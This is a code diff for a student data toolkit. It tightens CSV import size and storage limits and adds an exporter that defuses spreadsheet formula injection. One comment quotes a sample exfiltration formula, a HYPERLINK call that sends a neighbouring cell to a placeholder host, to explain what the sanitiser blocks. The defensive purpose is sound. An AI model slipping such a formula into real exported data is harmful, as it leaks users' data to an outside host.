@@ -70,13 +70,25 @@ export interface DataProject {
 
 export type ImportResult = { ok: true; project: DataProject } | { ok: false; reason: string; route?: string };
 
-export const MAX_RAW = 2_000_000;
+/*
+ * Storage budget. Datasets live in localStorage, which one origin shares with
+ * every other part of Semester — sign-in, threads, the other device
+ * libraries. A toolkit that filled it would break those, and the failure
+ * would land on whichever unrelated write came next. So the toolkit keeps
+ * well inside the quota: one dataset's raw text at most `MAX_RAW`, and the
+ * whole data library at most `DATA_BUDGET` characters once serialized
+ * (JSON escaping can nearly double a CSV full of quotes and newlines, which
+ * is why the budget is more than twice the per-file cap). Larger files
+ * belong in Analyse data, which reads them without keeping a copy.
+ */
+export const MAX_RAW = 400_000;
+export const DATA_BUDGET = 1_000_000;
 
 export function importCsv(id: string, name: string, text: string, tier: Tier | undefined, now: Date): ImportResult {
   const verdict = gate(tier, 'store', false);
   if (!verdict.allowed) return { ok: false, reason: verdict.reason, route: verdict.route };
   if (!tier) return { ok: false, reason: 'Choose what kind of data this is before importing it.' };
-  if (text.length > MAX_RAW) return { ok: false, reason: 'This file is larger than 2 MB. Import a smaller extract.' };
+  if (text.length > MAX_RAW) return { ok: false, reason: 'This file is larger than 400 KB. Import a smaller extract, or open the whole file in Analyse data.' };
   const table = parseCsv(text);
   if (!table.headers.length || !table.rows.length) return { ok: false, reason: 'No rows found. Check the file has a header row and data.' };
   return {
@@ -236,6 +248,35 @@ export function interpretationGaps(p: DataProject): string[] {
     out.push('The conclusion uses causal wording, but the data is not from a randomized design. Say “is associated with” instead.');
   if (unconfirmed(p).length) out.push(`Confirm the dictionary for: ${unconfirmed(p).join(', ')}.`);
   return out;
+}
+
+/**
+ * Whether one more dataset fits in the library's budget, measured the way it
+ * will be stored.
+ */
+export const fits = (next: readonly DataProject[]) => JSON.stringify(next).length <= DATA_BUDGET;
+
+/*
+ * A cell a spreadsheet would read as a formula. `=`, `+`, `-` and `@` start
+ * one in Excel, Sheets and LibreOffice, and a leading tab or carriage return
+ * can hide one. `=HYPERLINK("http://x/?"&A2)` in a course dataset would send
+ * the neighbouring cell to that address the moment the export is opened.
+ */
+const FORMULA = /^[=+\-@\t\r]/;
+
+/**
+ * CSV for a spreadsheet to open safely: formula-like cells are prefixed with
+ * an apostrophe, which every spreadsheet shows as text, and any cell holding
+ * a quote, comma or line break is quoted. A negative number loses nothing a
+ * reader cares about — `'-3` displays as -3 — and the raw data, which is what
+ * the analysis used, is untouched.
+ */
+export function toCsv(table: Table): string {
+  const cell = (c: string) => {
+    const safe = FORMULA.test(c) ? `'${c}` : c;
+    return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
+  };
+  return [table.headers, ...table.rows].map((r) => r.map(cell).join(',')).join('\n');
 }
 
 export function methodsWriteUp(p: DataProject): string {
